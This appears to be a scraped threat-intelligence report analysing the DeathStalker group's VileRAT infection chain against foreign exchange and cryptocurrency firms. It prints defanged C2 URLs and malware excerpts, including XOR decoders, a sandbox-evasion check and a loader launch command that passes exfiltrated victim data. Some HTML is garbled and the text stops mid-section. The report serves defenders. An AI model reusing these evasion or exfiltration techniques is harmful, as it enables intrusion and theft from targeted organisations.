							</p>
														<h1 class="c-article__title">VileRAT: DeathStalker&#8217;s continuous strike at foreign and cryptocurrency exchanges</h1>							<div class="c-article__info">
																<p class="c-article__headline u-hidden u-block@md">
									<a href="https://securelist.com/category/apt-reports/" class="c-tag c-tag--primary">APT reports</a>
								</p>
																<p class="u-uppercase"><time datetime="2022-08-10T10:00:43+00:00">10 Aug 2022</time></p>
								<p class="c-article__reading u-ml-auto@md">
									<svg class="o-icon o-svg-icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://securelist.com/wp-content/themes/securelist2020/assets/sprite/icons.svg#icon-hourglass"></use></svg> <span class="js-reading-time"></span> minute read								</p>

												</div>

													<img src="https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories--invert.svg" />

			<a  href="https://securelist.com/author/giampaolodedola/" >

											<div class="js-reading-content">
												<div class="c-wysiwyg">
													<p>In late August 2020, we published an <a href="https://securelist.com/deathstalker-mercenary-triumvirate/98177/">overview</a> of DeathStalker&#8217;s profile and malicious activities, including their Janicab, Evilnum and PowerSing campaigns (<a href="https://securelist.com/what-did-deathstalker-hide-between-two-ferns/99616/">PowerPepper</a> was later documented in 2020). Notably, we exposed why we believe the threat actor may fit a group of mercenaries, offering hack-for-hire services, or acting as an information broker to support competitive and financial intelligence efforts.</p>
<p>Meanwhile, in August 2020, we also released a private report on VileRAT to our threat intelligence customers for the first time. VileRAT is a Python implant, part of an evasive and highly intricate attack campaign against foreign exchange and cryptocurrency trading companies. We discovered it in Q2 2020 as part of an update of the <a href="https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/">Evilnum</a> modus operandi, and attributed it to DeathStalker. Malicious activities that we associate with DeathStalker&#8217;s VileRAT track have been publicly and partly documented since, without any attribution or under different monikers (Evilnum, PyVil), starting in <a href="https://www.cybereason.com/blog/research/no-rest-for-the-wicked-evilnum-unleashes-pyvil-rat">September 2020</a>, through <a href="https://github.com/eset/malware-ioc/tree/master/evilnum#february-2021-pyvil-and-evilnum-update">2021</a> and more recently in <a href="https://www.zscaler.com/blogs/security-research/return-evilnum-apt-updated-ttps-and-new-targets">June 2022</a>.</p>
<p>DeathStalker has indeed continuously leveraged and updated its VileRAT toolchain against the same type of targets since we first identified it in June 2020. While we comprehensively documented the evolution to our threat intelligence customers recently, and despite existing public indicators of compromise, we regret to note that the campaign is not only ongoing at the time of writing, but also that DeathStalker likely increased its efforts to compromise targets using this toolchain recently. We have indeed been able to identify more samples of VileRAT-associated malicious files and new infrastructure since March 2022, which may be a symptom of an increase in compromise attempts. We deemed it may be helpful to publicly expose some of our knowledge about VileRAT, to help potential targets better detect and stop such malicious activities.</p>
<h2 id="vilerats-initial-infection-and-toolset-overview">VileRAT&#8217;s initial infection and toolset overview</h2>
<p>Back in the summer of 2020, DeathStalker&#8217;s VileRAT initial infection consisted in spear-phishing emails sent to foreign exchange companies, from fake personas (a fake diamonds trading company for instance) who shared investment interests. Should the target reply and continue with the conversation, the fake persona would at some point and upon request provide a link to a malicious file hosted on Google Drive (a Windows shortcut file masquerading as a PDF or in a ZIP archive), as identification documents. The malicious link would then trigger the execution of arbitrary system commands, to drop a harmless decoy document, as well as a malicious and quite sophisticated binary loader that we dubbed VileLoader.</p>
<p>More recently, since at least late 2021, the infection technique has changed slightly, but the initial infection vector is still a malicious message: a Word document (DOCX, see Figure 1) is sent to targets via email (either as an attachment or embedded in the email body whenever possible). In July 2022, we also noticed that the attackers leveraged chatbots that are embedded in targeted companies&#8217; public websites to send malicious DOCX to their targets.</p>
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01.png" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-107082" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-1024x669.png" alt="Malicious DOCX social engineering message" width="1024" height="669" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-1024x669.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-300x196.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-768x501.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-268x175.png 268w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-370x242.png 370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-429x280.png 429w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01-800x522.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135313/VileRAT_DeathStalkers_continuous_strike_01.png 1066w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<p style="text-align: center"><em><strong>Figure 1. Malicious DOCX social engineering message</strong></em></p>
<p>The DOCX documents are frequently named using the &#8220;compliance&#8221; or &#8220;complaint&#8221; keywords (as well as the name of the targeted company), suggesting the attacker is answering an identification request or expressing an issue as a reason to send them.</p>
<p>The initial infection and toolset deployment, as we observed them starting in at least late 2021, are schematized below (see Figure 2).</p>
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02.png" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-107083" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-1024x576.png" alt="VileRAT infection and toolset overview" width="1024" height="576" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-1024x576.png 1024w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-300x169.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-768x432.png 768w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-800x450.png 800w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-311x175.png 311w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-370x208.png 370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02-498x280.png 498w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135347/VileRAT_DeathStalkers_continuous_strike_02.png 1440w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<p style="text-align: center"><em><strong>Figure 2. VileRAT infection and toolset overview</strong></em></p>
<h2 id="a-bit-of-stomping-and-concealment-up-to-viledropper">A bit of stomping and concealment up to VileDropper</h2>
<p>The initial DOCX infection document itself is innocuous, but it contains a link to another malicious and macro-enabled DOTM document as a &#8220;remote template&#8221; (see Figure 3). These DOTM files are automatically downloaded by Word when the DOCX is opened, and its embedded macro is triggered if the recipient enabled execution (as requested by the social engineering message, see Figure 1).</p>
		<div id="crayon-6762369aa9ec4489465828" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">

class="crayon-s">"hxxp://plantgrn[.]com/HjSYaquyA5umRSZcy%2B0xLfaIdgf5Qq8BA6EggZELrzkAAADvNjKmxl00LiQYCUFp2DSHYB8NW18l94y4JmYJq84iAcUK4DiouvcYORosLa5BzVcmWShg6Y6sjwg%3D"</span><span class="crayon-h"> 					</tr>
				</table>
			</div>
		</div><p>
<p style="text-align: center"><strong><em>Figure 3. Malicious remote template inclusion in infection DOCX</em></strong></p>
<p>The malicious DOTM remote templates leverage the <a href="https://attack.mitre.org/techniques/T1564/007/">VBA stomping</a> technique to conceal the code of an embedded macro. VBA stomping involves making the editable VBA source code (i.e., the visible code of a macro) different from the code that will actually be executed. This is possible because both the editable (visible) source code and a transformed internal version of it called <a href="https://github.com/bontchev/pcodedmp">p-code</a> are embedded in macro-enabled documents. As a result of VBA stomping, the real macro code that will be executed is hidden from standard tools (Microsoft Word&#8217;s macro edition tools, but also <a href="http://www.decalage.info/python/oletools">OLETools</a>).</p>
<p>This technique comes with a drastic limitation: the hidden macro (i.e., internal p-code) can only be executed if the macro-enabled document is opened with the same Office version from which it was generated. Otherwise, the hidden macro cannot run, and the visible one will be executed instead. In this last case, DeathStalker ensured it would result in a popup message to the user (see Figure 4). But most of all, DeathStalker ensured that it distributed several variants of infection documents to their targets, each one being prepared for a specific Office version.</p>
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135421/VileRAT_DeathStalkers_continuous_strike_03.jpg" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-107084" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135421/VileRAT_DeathStalkers_continuous_strike_03.jpg" alt="VBA stomping failure in a malicious DOTM remote template" width="220" height="167" /></a></p>
<p style="text-align: center"><em><strong>Figure 4. VBA stomping failure in a malicious DOTM remote template</strong></em></p>
<p>In any case, the visible and hidden macros download a picture to replace the social engineering message in the infection document (see Figure 5) and trick the readers into believing something failed.</p>
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135446/VileRAT_DeathStalkers_continuous_strike_04.png" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-107085" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135446/VileRAT_DeathStalkers_continuous_strike_04.png" alt="Example of a downloaded image upon macro execution" width="444" height="59" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135446/VileRAT_DeathStalkers_continuous_strike_04.png 444w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135446/VileRAT_DeathStalkers_continuous_strike_04-300x40.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135446/VileRAT_DeathStalkers_continuous_strike_04-370x49.png 370w" sizes="(max-width: 444px) 100vw, 444px" /></a></p>
<p style="text-align: center"><em><strong>Figure 5. Example of a downloaded image upon macro execution</strong></em></p>
<p>In the background, however, provided the VBA stomping worked, the DOTM-embedded macro silently gathers information about security products that are installed on the target computer (using <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/creating-a-wmi-script">WMI</a>), sends them to a command-and-control (C2) server, decodes and drops files, then ultimately executes a malicious obfuscated JavaScript (JS) backdoor we called VileDropper.</p>
<p>The DOTM-embedded macro itself already reveals some interesting and specific techniques. It is lightly obfuscated, as most text strings are XOR-encoded (see Figure 6) with a password that is derived from a sentence (e.g., &#8220;<em>Operates Catholic small towns pueblos Two of</em>&#8220;).</p>
		<div id="crayon-6762369aa9ecb298212597" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Function decodestring(dt As String) As String
    On Error Resume Next
    Dim ks As String
    ks = decodepassword
    Dim dl As Long
    dl = ((Len(dt) / 2) - 1)
    kl = Len(ks)
    Dim s As String
    s = ""
    For i = 0 To dl
        Dim c1 As Integer
        Dim c2 As Integer
        c1 = Val("&amp;H" &amp; Mid(dt, ((i * 2) + 1), 2))
        c2 = Asc(Mid(ks, (i Mod kl) + 1, 1))
        s = s &amp; Chr(c1 Xor c2)
    Next
    decodestring = s
End Function</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">

		</div><p>
<p style="text-align: center"><strong><em>Figure 6. XOR decoding function (renamed for clarity) in DOTM-embedded macro</em></strong></p>
<p>The XOR decoding algorithm looks very close to the one that has been leveraged in VBS loader scripts from the <a href="https://securelist.com/what-did-deathstalker-hide-between-two-ferns/99616/">PowerPepper</a> toolchain (see Figure 7) in the past, and seemingly legitimate function names are also reminiscent of those that were used by PowerPepper macros (e.g., &#8220;insert_table_of_figures&#8221;, &#8220;change_highlight_color&#8221;, etc.).</p>
		<div id="crayon-6762369aa9ecd713689901" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Function DelPort(GeneralText)
    Dim Argv : Argv = WScript.Arguments(0)
    GeneralText = Replace(GeneralText, "44f","44")
    Dim z, i, cvpo, vpcol, sdfiko, gfdvvc, sdfopk
    For i = 1 To Len(GeneralText)
        cvpo = cvpo + 1
        If cvpo &gt; Len(Argv) Then cvpo = 1
        gfdvvc = Asc(Mid(Argv, cvpo, 1))
        If i &gt; Len(GeneralText) \ 2 Then Exit For
        vpcol = CByte("&amp;H" &amp; Mid(GeneralText, i * 2 - 1, 2))
        sdfiko = vpcol Xor gfdvvc
        z = z &amp; Chr(sdfiko)
    Next
    DelPort = z
End Function</textarea></div>

class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-6762369aa9ecd713689901-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">sdfiko</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">vpcol </span><span class="crayon-st">Xor</span><span class="crayon-h"> </span><span class="crayon-i">gfdvvc</span></div><div class="crayon-line class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">Next</span></div><div class="crayon-line crayon-striped-line" id="crayon-6762369aa9ecd713689901-14"><span class="crayon-e">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">DelPort</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">z</span></div><div 					</tr>
				</table>
			</div>
		</div><p>
<p style="text-align: center"><strong><em>Figure 7. XOR decoding function in a PowerPepper VBS loader (MD5 DB6D1F6AB887383782E4E3D6E4AACDD0)</em></strong></p>
<p>The DOTM-embedded macro decodes and drops two files (in the &#8220;%APPDATA%&#8221; folder: &#8220;Redist.txt&#8221; and &#8220;ThirdPartyNotice.txt&#8221;, or &#8220;pattern.txt&#8221; and &#8220;changelog.txt&#8221;) out of encoded data that is stored in non-visible <a href="https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/textbox-control">TextBox forms</a> (see Figure 8). Leveraging Office object properties as hidden data sources is also something we have previously seen with PowerPepper.</p>
<p style="text-align: center"><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135520/VileRAT_DeathStalkers_continuous_strike_05.png" class="magnificImage"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-107086" src="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135520/VileRAT_DeathStalkers_continuous_strike_05.png" alt="TextBox form used as a data store within malicious DOTM documents, as shown by Microsoft's VBA editor" width="571" height="290" srcset="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135520/VileRAT_DeathStalkers_continuous_strike_05.png 571w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135520/VileRAT_DeathStalkers_continuous_strike_05-300x152.png 300w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135520/VileRAT_DeathStalkers_continuous_strike_05-345x175.png 345w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135520/VileRAT_DeathStalkers_continuous_strike_05-370x188.png 370w, https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/08/05135520/VileRAT_DeathStalkers_continuous_strike_05-551x280.png 551w" sizes="(max-width: 571px) 100vw, 571px" /></a></p>
<p style="text-align: center"><em><strong>Figure 8. TextBox form used as a data store within malicious DOTM documents, as shown by Microsoft&#8217;s VBA editor</strong></em></p>
<p>Another notable feature is that the DOTM-embedded macro signals progression or errors during the execution by sending HTTP GET requests to fixed C2 URLs. Interestingly, all HTTP requests in the VBA macro are triggered using <a href="https://docs.microsoft.com/en-us/office/vba/api/word.shapes.addpicture">remote picture insertion functions</a> (see Figure 9).</p>

&#8220;changelog.txt&#8221; is VileDropper, while &#8220;91&#8221; is part of password used by VileDropper to decode XORed data, and &#8220;pattern.txt&#8221; is an encoded package that contains VileLoader.</p>
<h2 id="viledropper-an-overly-obfuscated-task-scheduler">VileDropper: an overly obfuscated task scheduler</h2>
<p>Next in DeathStalker&#8217;s intricate VileRAT infection chain comes VileDropper. It is an obfuscated JavaScript file that mainly drops and schedules the execution of the next stage: VileLoader.</p>
		<div id="crayon-6762369aa9ed3181635525" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">

		</div><p>
<p style="text-align: center"><strong><em>Figure 10. VileDropper code excerpt in its original form</em></strong></p>
<p>VileDropper needs at least two arguments to run for the first time (a third may be used as a flag to trigger environment-specific execution variations, depending on security products that are installed on targeted computers):</p>
<ul>
<li>the first one is a partial password (used to decode XOR-encoded data),</li>
<li>the second is a path to an encoded payload file (contains VileLoader and its companion shellcode).</li>
</ul>
<p>VileDropper also checks its interpreter and file name, to immediately stop execution if it is not called as planned (this is probably done to evade sandboxes), as can be seen in the following deobfuscated code excerpt:</p>
		<div id="crayon-6762369aa9ed4829057559" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>

if (aWShell1["CurrentDirectory"]["toLowerCase"]() != aAppDataPath1["toLowerCase"]()) {
    WScript["Quit"]();

    if (-0x1 == aScriptHostFullpath1["indexOf"]("msdcat")) {
        WScript["Quit"]();
    }

    }

		</div><p>
<p style="text-align: center"><strong><em>Figure 11. Deobfuscated execution check in VileDropper</em></strong></p>
<p>VileDropper&#8217;s exact execution flow depends on the security products that are installed on the targeted computer, but most of the time, it copies itself to another file, relaunches itself, and deletes its original copy. During execution VileDropper:</p>
<ul>
<li>gathers additional data on the targeted environment (using WMI) as well as generating a target identifier and sends them to a C2 server;</li>
<li>decodes and drops VileLoader and its encoded companion shellcode. The file names and location will vary depending on samples, but they are placed under a seemingly legitimate common folder in &#8220;%APPDATA%&#8221; (e.g., &#8220;exe&#8221; and &#8220;dev0Y11ZF.tmp&#8221; in &#8220;%APPDATA%\Microsoft\Printer Settings\Printers\&#8221;);</li>
<li>schedules a task to run VileLoader 35 to 65 seconds later, then indefinitely every three hours and 45 minutes.</li>
</ul>
<p>VileDropper sends data to a C2 server using an HTTP GET request to a fixed URL (e.g., &#8220;hxxp://hubflash[.]co/admin/auth.php&#8221;), using a preset User-Agent (both the C2 URL and the User-Agent change depending on VileDropper samples). The useful information is stored as a JSON document, which is then XOR-encoded, base64-encoded, URL-encoded, and set as a cookie value in the HTTP request:</p>
<table width="100%">
<tbody>
<tr>
<td width="14%"><strong>JSON Key</strong></td>
<td width="86%"><strong>Content (JSON value)</strong></td>
</tr>
<tr>
<td>u</td>
<td>A target identifier. The identifier is a custom UUID-like representation of the target&#8217;s login (%USERNAME% environment variable) and computer UUID (as obtained in the first result of the WMI query: SELECT UUID FROM Win32_ComputerSystemProduct). This UUID-like value is then base64-encoded and URL-encoded. Due to fixed lengths and padding from the identifier generation logic, the identifier&#8217;s final form is always 48 characters long.</td>
</tr>
<tr>
<td>d</td>
<td>A hard-coded VileDropper identifier, which might designate a campaign or version (e.g., &#8220;9745B355&#8221;).</td>
</tr>
<tr>
<td>a</td>
<td>A list of the names of the security products (AntiVirusProduct in WMI) that are installed on the target computer, separated by the pipe sign (|), then XORed, base64-encoded and URL-encoded.</td>
</tr>
<tr>
<td>n</td>
<td>The target&#8217;s fully qualified login, as the shell expansion of &#8220;%USERDOMAIN%\%USERNAME%&#8221;, which is then XORed, base64-encoded and URL-encoded.</td>
</tr>
<tr>
<td>w</td>
<td>The target&#8217;s operating system version, as returned from the WMI query SELECT Version FROM Win32_OperatingSystem, then base64-encoded and URL-encoded.</td>
</tr>
</tbody>
</table>
<p>The task that is <a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--scripting-">scheduled</a> by VileDropper (whose name varies depending on samples, e.g., &#8220;CDS Sync&#8221; or &#8220;UpdateModel Task&#8221;), triggers the following type of execution command:</p>
		<div id="crayon-6762369aa9ed6543369192" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%APPDATA%\Microsoft\Printer Settings\Printers\FWDeviceEnabler.exe "[u]" "&lt;encoded companion shellcode file name&gt;" "[a]" "[w]" 0 "[d]" "[n]" &lt;a letter of the encoded companion shellcode file name&gt;</textarea></div>

				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6762369aa9ed6543369192-1"><span class="crayon-sy">%</span><span class="crayon-i">APPDATA</span><span class="crayon-sy">%</span><span class="crayon-sy">\</span><span class="crayon-i">Microsoft</span><span class="crayon-sy">\</span><span class="crayon-e">Printer </span><span class="crayon-i">Settings</span><span class="crayon-sy">\</span><span class="crayon-i">Printers</span><span class="crayon-sy">\</span><span class="crayon-i">FWDeviceEnabler</span><span class="crayon-sy">.</span><span class="crayon-i">exe</span><span class="crayon-h"> </span><span class="crayon-s">"[u]"</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;encoded companion shellcode file name&gt;"</span><span class="crayon-h"> </span><span class="crayon-s">"[a]"</span><span class="crayon-h"> </span><span class="crayon-s">"[w]"</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-h"> </span><span class="crayon-s">"[d]"</span><span class="crayon-h"> </span><span class="crayon-s">"[n]"</span><span class="crayon-h"> </span><span class="crayon-h">&lt;</span><span class="crayon-i">a</span><span class="crayon-h"> </span><span class="crayon-e">letter </span><span class="crayon-e">of </span><span class="crayon-e">the </span><span class="crayon-e">encoded </span><span class="crayon-e">companion </span><span class="crayon-e">shellcode </span><span class="crayon-e">file </span><span class="crayon-i">name</span><span class="crayon-h">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The characters between square brackets (such as <strong>[u]</strong>) in the command line designate the content of the corresponding JSON key (i.e., [u] is the encoded target identifier).</p>
<h2 id="a-xoring-interlude">A XORing interlude</h2>
<p>Before moving on to VileLoader, a note on the XOR encoding scheme that is leveraged by VileDropper to protect data sent to the C2 server, as similar schemes will be used further on. The algorithm generates data blobs that are laid out as follows (then sometimes further base64-encoded and URL-encoded):</p>
<p>Type A:</p>
		<div id="crayon-6762369aa9ed8678998262" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>

[XOR key (6 random bytes)][XOR-encoded data]</textarea></div>

				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-6762369aa9ed8678998262-1"><span class="crayon-sy">[</span><span class="crayon-st">XOR</span><span class="crayon-h"> </span><span class="crayon-e">key</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">6</span><span class="crayon-h"> </span><span class="crayon-e">random </span><span class="crayon-i">bytes</span><span class="crayon-sy">)</span><span class="crayon-sy">]</span><span class="crayon-sy">[</span><span class="crayon-st">XOR</span>-<span class="crayon-e">encoded </span><span class="crayon-i">data</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div><p>
The resulting blobs are self-sufficient and can be decoded by the recipient (as well as any third party…) without any access to the pre-shared key. In VileDropper, strings that are encoded as part of the JavaScript obfuscation benefit from an additional XORing step: the XOR key that is embedded in data blobs is additionally XORed with a script-specific fixed password (a part of this fixed password is passed to VileDropper on its execution command line by the previous DOTM macro in the infection chain, the other part is hard-coded in VileDropper itself).</p>
<p>Later, VileLoader and VileRAT use other variants of this algorithm, which produces data blobs that are laid out as one of the following options:</p>
